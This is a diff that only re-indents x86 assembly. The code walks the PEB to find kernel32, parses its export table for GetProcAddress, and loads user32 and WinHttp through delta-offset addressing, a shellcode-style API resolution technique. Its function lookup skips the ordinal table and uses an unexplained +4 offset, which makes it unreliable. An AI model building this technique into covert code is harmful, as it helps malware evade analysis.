@@ -11,49 +11,49 @@ mov 	ebx, [ebx + 0Ch] ; PEB_LDR
 mov 	ebx, [ebx + 014h] ; LBR 1st
 mov 	ebx, [ebx] ; 2nd entry
 mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
-mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
-mov	[DELTA pKernel32], ebx
+mov	    ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
+mov	    [DELTA pKernel32], ebx
 
 ; GET PROPERTIES DLL
-mov	esi, [ebx + 03Ch] ; PE Header offset
-add	esi, ebx
-mov	esi, [esi + 078h] ; Export table offset
-add	esi, ebx
-mov	edi, [esi + 020h] ; Export Name Table offset
-add	edi, ebx
-mov	ecx, [esi + 014h] ; Number of functions
+mov	    esi, [ebx + 03Ch] ; PE Header offset
+add	    esi, ebx
+mov	    esi, [esi + 078h] ; Export table offset
+add	    esi, ebx
+mov	    edi, [esi + 020h] ; Export Name Table offset
+add	    edi, ebx
+mov	    ecx, [esi + 014h] ; Number of functions
 
 ; LOOP FROM FUNCTIONS AND GET LoadLibrary & GetProcAddress
-mov	eax, ebp
-add	eax, offset sGetProcAddress
-mov	edx, eax ; Search function
-xor	eax, eax ; Counter
+mov	    eax, ebp
+add	    eax, offset sGetProcAddress
+mov	    edx, eax ; Search function
+xor	    eax, eax ; Counter
 checkFunctionName:
-mov	ecx, [edi] ; Function name offset
-add	ecx, ebx
-pusha ; Keep register
+mov	    ecx, [edi] ; Function name offset
+add	    ecx, ebx
+pusha   ; Keep register
 call	stricmp
 test	eax, eax
 popa
-jz	functionFound
-add	edi, 4 ; Get next function name
-inc	eax
-jmp	checkFunctionName ; I will find you
+jz	    functionFound
+add	    edi, 4 ; Get next function name
+inc	    eax
+jmp	    checkFunctionName ; I will find you
 functionFound:
-mov	edx, [esi + 01Ch] ; List of entry point
-add	edx, ebx
-mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
-add	edx, ebx
-mov	[DELTA pGetProcAddress], edx
+mov	    edx, [esi + 01Ch] ; List of entry point
+add	    edx, ebx
+mov	    edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
+add	    edx, ebx
+mov	    [DELTA pGetProcAddress], edx
 
 ; Get User32 (Not without LoadLibrary !)
 GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
 PDELTA	sUser32
 call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
-mov	[DELTA pUser32], eax
+mov	    [DELTA pUser32], eax
 PDELTA	sWinHttp
 call	[DELTA pLoadLibrary] ; LoadLibrary("Winhttp.dll")
-mov	[DELTA pWinHttp], eax
+mov	    [DELTA pWinHttp], eax
 ; GET ALL THE THINGS !
 GETADDR	sMessageBox, pUser32, pMessageBox
 GETADDR	sExitProcess, pKernel32, pExitProcess
